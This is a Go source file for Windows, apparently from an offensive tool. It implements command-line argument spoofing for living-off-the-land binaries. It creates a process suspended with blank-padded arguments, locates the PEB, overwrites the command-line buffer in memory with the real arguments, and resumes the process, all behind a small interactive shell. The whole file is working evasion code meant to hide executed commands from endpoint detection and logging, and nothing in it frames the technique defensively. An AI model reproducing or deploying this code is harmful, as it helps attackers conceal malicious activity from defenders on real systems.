package main

import (
	"bufio"
	"fmt"
	"golang.org/x/sys/windows"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"unsafe"
)

// processInput handles the user input and executes the corresponding command
func processInput(input string) {
	switch strings.ToLower(input) {
	case "!exit":
		// Exit the shell
		fmt.Println("[!] Exiting the shell.")
		os.Exit(0)
	case "!cls":
		// Clear the screen
		clearScreen()
	case "!help":
		// Display help message
		fmt.Println("[!] Available commands:")
		fmt.Println(helpcmd)
	default:
		// Invalid command
		fmt.Println("[-] Invalid command. Type '!help' for available commands.")
	}
}

// clearScreen clears the terminal screen based on the operating system
func clearScreen() {
	cmd := exec.Command("clear")
	cmd = exec.Command("cmd", "/c", "cls")
	cmd.Stdout = os.Stdout
	err := cmd.Run()
	if err != nil {
		return
	}
}

func readLineFromStdin() string {
	scanner := bufio.NewScanner(os.Stdin)
	scanner.Scan()
	return scanner.Text()
}

func executeSpoofedLolbin(realCmdlineN string) bool {

	binary := strings.Fields(realCmdlineN)[0]
	argsLen := len(realCmdlineN) - len(binary)
	spoofedCmdlineN := binary + strings.Repeat(" ", argsLen)

	realCmdline, err := utf16PtrFromString(realCmdlineN)
	if err != nil {
		fmt.Println("[-] Error creating wide string:", err)
		return false
	}

	spoofedCmdline, err := utf16PtrFromString(spoofedCmdlineN)
	if err != nil {
		fmt.Println("[-] Error creating wide string:", err)
		return false
	}

	si := new(syscall.StartupInfo)
	pi := new(syscall.ProcessInformation)
	defer func(handle syscall.Handle) {
		err := syscall.CloseHandle(handle)
		if err != nil {

		}
	}(pi.Thread)
	defer func(handle syscall.Handle) {
		err := syscall.CloseHandle(handle)
		if err != nil {

		}
	}(pi.Process)

	// CREATE_SUSPENDED := 0x00000004
	err = syscall.CreateProcess(nil, spoofedCmdline, nil, nil, false, windows.CREATE_SUSPENDED, nil, nil, si, pi)
	if err != nil {
		//panic(err)
		return false
	}

	var pbi PROCESS_BASIC_INFORMATION

	// call NtQueryInformationProcess function
	ret, err := ntQueryInformationProcess(pi.Process, PROCESS_BASIC_INFORMATION_CLASS, uintptr(unsafe.Pointer(&pbi)), uint32(unsafe.Sizeof(pbi)), nil)
	if ret != 0 {
		fmt.Println("[-] Error calling NtQueryInformationProcess:", err)
		return false
	}

	processParametersOffset := pbi.PebBaseAddress + 0x20

	var processParametersAddress uintptr
	// call ReadProcessMemory function
	err = ReadProcessMemory(pi.Process, processParametersOffset, uintptr(unsafe.Pointer(&processParametersAddress)), 8, 0)
	if err != nil {
		fmt.Println("[-] Error calling ReadProcessMemory: ", err)
		return false
	}

	cmdLineOffset := processParametersAddress + 0x70 + 0x8
	var cmdLineAddress uintptr
	err = ReadProcessMemory(pi.Process, cmdLineOffset, uintptr(unsafe.Pointer(&cmdLineAddress)), 8, 0)
	if err != nil {
		fmt.Println("[-] Error calling ReadProcessMemory: ", err)
		return false
	}

	err = WriteProcessMemory(pi.Process, cmdLineAddress, unsafe.Pointer(realCmdline), uintptr(uint(len(realCmdlineN))*2), nil)
	if err != nil {
		fmt.Println("[-] Error calling writeProcessMemory: ", err)
		return false
	}

	err = ResumeThread(windows.Handle(pi.Thread))
	if err != nil {
		fmt.Println(err)
		return false
	}

	_, err = WaitForSingleObject(pi.Thread, infinite)

	if err != nil {
		fmt.Println(err)
		return false
	}

	return true
}

func utf16PtrFromString(s string) (*uint16, error) {
	utf16Str, err := syscall.UTF16FromString(s)
	if err != nil {
		return nil, err
	}
	return &utf16Str[0], nil
}

func ntQueryInformationProcess(processHandle syscall.Handle, processInformationClass uint32, processInformation uintptr, processInformationLength uint32, returnLength *uint32) (uintptr, error) {
	ret, _, err := ntQueryInfoProc.Call(
		uintptr(processHandle),
		uintptr(processInformationClass),
		processInformation,
		uintptr(processInformationLength),
		uintptr(unsafe.Pointer(returnLength)),
	)
	if ret != 0 {
		return 0, err
	}
	return ret, nil
}

func ReadProcessMemory(hProcess syscall.Handle, lpBaseAddress uintptr, buffer uintptr, size uintptr, bytesRead uintptr) error {
	ret, _, err := readProcessMemory.Call(
		uintptr(hProcess),
		lpBaseAddress,
		buffer,
		size,
		bytesRead,
	)

	if ret == 0 {
		return err
	}
	return nil
}

func WriteProcessMemory(hProcess syscall.Handle, lpBaseAddress uintptr, buffer unsafe.Pointer, size uintptr, bytesWritten *uintptr) error {
	ret, _, err := writeProcessMemory.Call(
		uintptr(hProcess),
		lpBaseAddress,
		uintptr(buffer),
		size,
		uintptr(unsafe.Pointer(bytesWritten)),
	)
	if ret == 0 {
		return err
	}
	return nil
}

func ResumeThread(threadHandle windows.Handle) error {
	var suspendCount uint32
	status, _, _ := ntResumeThread.Call(
		uintptr(threadHandle),
		uintptr(unsafe.Pointer(&suspendCount)),
	)
	if status != 0 {
		return fmt.Errorf("Failed to call NtResumeThread: %x", status)
	}
	return nil
}

func WaitForSingleObject(hHandle syscall.Handle, dwMilliseconds uint32) (uintptr, error) {
	ret, _, err := waitForSingleObject.Call(
		uintptr(hHandle),
		uintptr(dwMilliseconds),
	)

	if ret == 0xFFFFFFFF {
		return ret, err
	}

	return ret, nil
}
